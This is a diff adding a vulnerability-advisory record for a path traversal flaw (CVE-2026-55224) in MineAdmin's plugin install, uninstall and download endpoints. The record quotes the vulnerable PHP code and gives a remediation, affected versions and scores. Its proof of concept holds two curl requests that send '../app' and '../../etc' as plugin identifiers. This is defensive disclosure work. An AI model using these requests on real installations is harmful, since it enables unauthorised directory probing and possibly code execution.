@@ -1,0 +1,182 @@
+advisory_id: GHSA-59xm-4m8c-g3xj
+datasource_id: github_osv/GHSA-59xm-4m8c-g3xj
+datasource_url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/08/GHSA-59xm-4m8c-g3xj/GHSA-59xm-4m8c-g3xj.json
+aliases:
+  - CVE-2026-55224
+summary: |
+  MineAdmin Vulnerable to Path Traversal via Unsanitized identifier in Plugin Install/Uninstall
+  ## Path Traversal via Unsanitized Identifier in Plugin Install/Uninstall
+
+  ### Summary
+  The app-store plugin service concatenates unsanitized user-supplied `identifier` values directly into file system paths. An attacker can use path traversal sequences (e.g., `../`) to read, install, or uninstall plugins from arbitrary directories, and potentially execute arbitrary composer commands.
+
+  ### Vulnerable Code
+
+  **File:** `plugin/mine-admin/app-store/src/Service/Service.php`
+
+  ```php
+  // Line 32 - download(): path traversal via identifier
+  public function download(array $params): bool
+  {
+      if (empty($params['identifier']) || empty($params['version'])) {
+          $this->throwParamsFail();
+      }
+      $service = make(AppStoreServiceImpl::class);
+      if (! is_dir(BASE_PATH . '/plugin/' . $params['identifier'])) {  // Path traversal
+          $result = $service->download($params['identifier'], $params['version']);
+          // ...
+      }
+      return true;
+  }
+
+  // Line 48 - install(): path traversal + Plugin::install() with raw identifier
+  public function install(array $params): bool
+  {
+      // ...
+      $path = BASE_PATH . '/plugin/' . $params['identifier'];  // Path traversal
+      if (file_exists($path . '/install.lock')) {
+          $this->throwAppInstalled();
+      }
+      Plugin::install($params['identifier']);  // May run composer commands with traversal path
+      return true;
+  }
+
+  // Line 70 - unInstall(): same pattern
+  public function unInstall(array $params): bool
+  {
+      // ...
+      $path = BASE_PATH . '/plugin/' . $params['identifier'];  // Path traversal
+      Plugin::uninstall($params['identifier']);  // Arbitrary uninstall
+      return true;
+  }
+  ```
+
+  **File:** `plugin/mine-admin/app-store/src/Controller/IndexController.php` (lines 25-26)
+
+  ```php
+  #[Controller(prefix: 'admin/plugin/store')]
+  #[Middleware(middleware: AccessTokenMiddleware::class, priority: 100)]
+  // Only AccessTokenMiddleware -- no PermissionMiddleware (see GM-4340)
+  ```
+
+  ### Proof of Concept
+
+  ```bash
+  # Install a "plugin" from a traversed path, potentially triggering composer on
+  # arbitrary directories
+  curl -X POST "http://localhost:9501/admin/plugin/store/install" \
+    -H "Authorization: Bearer <JWT_TOKEN>" \
+    -H "Content-Type: application/json" \
+    -d '{"identifier": "../app", "version": "1.0.0"}'
+
+  # This resolves to BASE_PATH/plugin/../app = BASE_PATH/app
+  # Plugin::install("../app") processes the application directory as a plugin
+
+  # Check if arbitrary path exists:
+  curl -X POST "http://localhost:9501/admin/plugin/store/download" \
+    -H "Authorization: Bearer <JWT_TOKEN>" \
+    -H "Content-Type: application/json" \
+    -d '{"identifier": "../../etc", "version": "1.0.0"}'
+  ```
+
+  ### Impact
+
+  - Path traversal enables reading directory existence outside the plugin directory
+  - `Plugin::install()` with a traversed identifier may run composer commands on arbitrary directories
+  - Combined with GM-4340 (missing PermissionMiddleware), any authenticated user can exploit this
+  - Could lead to arbitrary code execution depending on `Plugin::install()` implementation
+
+  ### Remediation
+
+  Validate and sanitize the `identifier` parameter to reject path traversal sequences. Use `basename()` or a strict regex allowlist (e.g., `^[a-zA-Z0-9_-]+$`) before concatenating into file paths.\n\n---\n\n**Update:** This finding has now been fully reproduced and validated in a Docker environment. The vulnerability is confirmed exploitable as described in the original report.
+impacted_packages:
+  - purl: pkg:composer/mineadmin/mineadmin
+    affected_versions: vers:composer/<3.2.0-alpha.2
+    fixed_versions: vers:composer/3.2.0-alpha.2
+    affected_packages:
+      - pkg:composer/mineadmin/mineadmin@0.6.2
+      - pkg:composer/mineadmin/mineadmin@0.6.3
+      - pkg:composer/mineadmin/mineadmin@0.7.0
+      - pkg:composer/mineadmin/mineadmin@0.7.1
+      - pkg:composer/mineadmin/mineadmin@0.7.2
+      - pkg:composer/mineadmin/mineadmin@1.0.0
+      - pkg:composer/mineadmin/mineadmin@1.1.0
+      - pkg:composer/mineadmin/mineadmin@1.1.1
+      - pkg:composer/mineadmin/mineadmin@1.2.0
+      - pkg:composer/mineadmin/mineadmin@1.2.1
+      - pkg:composer/mineadmin/mineadmin@1.3.0
+      - pkg:composer/mineadmin/mineadmin@1.3.3
+      - pkg:composer/mineadmin/mineadmin@1.4.1
+      - pkg:composer/mineadmin/mineadmin@1.4.11
+      - pkg:composer/mineadmin/mineadmin@1.4.12
+      - pkg:composer/mineadmin/mineadmin@1.4.13
+      - pkg:composer/mineadmin/mineadmin@2.0.0-RC.1
+      - pkg:composer/mineadmin/mineadmin@2.0.0-alpha.1
+      - pkg:composer/mineadmin/mineadmin@2.0.0-alpha.2
+      - pkg:composer/mineadmin/mineadmin@2.0.0-alpha.3
+      - pkg:composer/mineadmin/mineadmin@2.0.0-alpha.4
+      - pkg:composer/mineadmin/mineadmin@2.0.0-alpha.5
+      - pkg:composer/mineadmin/mineadmin@2.0.0-beta
+      - pkg:composer/mineadmin/mineadmin@2.0.0-beta.1
+      - pkg:composer/mineadmin/mineadmin@2.0.0-beta.2
+      - pkg:composer/mineadmin/mineadmin@2.0.0-beta.3
+      - pkg:composer/mineadmin/mineadmin@2.0.0-beta.4
+      - pkg:composer/mineadmin/mineadmin@2.0.0-beta.5
+      - pkg:composer/mineadmin/mineadmin@2.0.0-beta.6
+      - pkg:composer/mineadmin/mineadmin@2.0.1
+      - pkg:composer/mineadmin/mineadmin@2.0.1%2B1
+      - pkg:composer/mineadmin/mineadmin@2.0.2
+      - pkg:composer/mineadmin/mineadmin@2.0.3
+      - pkg:composer/mineadmin/mineadmin@3.0.0-RC
+      - pkg:composer/mineadmin/mineadmin@3.0.0
+      - pkg:composer/mineadmin/mineadmin@3.0.1
+      - pkg:composer/mineadmin/mineadmin@3.0.2
+      - pkg:composer/mineadmin/mineadmin@3.0.3
+      - pkg:composer/mineadmin/mineadmin@3.0.4
+      - pkg:composer/mineadmin/mineadmin@3.0.5
+      - pkg:composer/mineadmin/mineadmin@3.0.6
+      - pkg:composer/mineadmin/mineadmin@3.0.7
+      - pkg:composer/mineadmin/mineadmin@3.0.8
+      - pkg:composer/mineadmin/mineadmin@3.0.9
+      - pkg:composer/mineadmin/mineadmin@3.2.0-alpha.1
+    fixed_packages:
+      - pkg:composer/mineadmin/mineadmin@3.2.0-alpha.2
+    fixed_in_commits: []
+    introduced_in_commits: []
+  - purl: pkg:github/mineadmin/mineadmin
+    affected_versions:
+    fixed_versions:
+    affected_packages: []
+    fixed_packages: []
+    fixed_in_commits:
+      - vcs_url: https://github.com/mineadmin/mineadmin
+        commit: ca41902a2a5422676227e5088f4cc1dec06044f1
+        patch_text:
+    introduced_in_commits: []
+severities:
+  - score: '8.7'
+    scoring_system: cvssv4
+    scoring_elements: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:H/VA:N/SC:N/SI:N/SA:N
+    published_at:
+    url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/08/GHSA-59xm-4m8c-g3xj/GHSA-59xm-4m8c-g3xj.json
+  - score: HIGH
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at:
+    url:
+weaknesses:
+  - CWE-22
+references:
+  - url: https://github.com/mineadmin/MineAdmin
+    reference_type:
+    reference_id:
+  - url: https://github.com/mineadmin/MineAdmin/commit/ca41902a2a5422676227e5088f4cc1dec06044f1
+    reference_type:
+    reference_id:
+  - url: https://github.com/mineadmin/MineAdmin/releases/tag/v3.2.0-alpha.2
+    reference_type:
+    reference_id:
+  - url: https://github.com/mineadmin/MineAdmin/security/advisories/GHSA-59xm-4m8c-g3xj
+    reference_type:
+    reference_id:
+exploits: []
